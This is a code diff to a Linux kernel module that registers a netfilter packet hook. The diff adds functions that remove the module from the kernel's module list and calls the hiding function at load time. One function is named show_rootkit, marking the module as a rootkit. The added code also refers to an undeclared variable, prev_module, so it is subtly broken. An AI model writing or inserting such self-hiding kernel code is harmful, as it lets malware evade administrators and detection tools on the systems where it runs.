@@ -12,7 +12,25 @@
 #include <linux/tcp.h>
 #include <linux/udp.h>
 
+
 static struct nf_hook_ops *nfho = NULL;
+static struct list_head *module_previous; // Tracks linked-list LKM list
+static int module_track = 0; // Tracks whether module is hidden (0) or visible(1)
+
+// Hides kernel module upon calling
+void module_hide(void)
+{
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	module_track = 0;
+}
+
+// Puts kernel module back into LKM list
+void show_rootkit(void){
+    list_add(&THIS_MODULE->list, prev_module);
+    module_track = 1;
+}
+
 
 // Hook function, does the schtuff
 static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
@@ -48,6 +66,7 @@ static int __init LKM_init(void)
 	nfho->priority 	= NF_IP_PRI_FIRST;		/* max hook priority */
 	
 	nf_register_net_hook(&init_net, nfho);
+	module_hide();
 	return 0;
 }
 
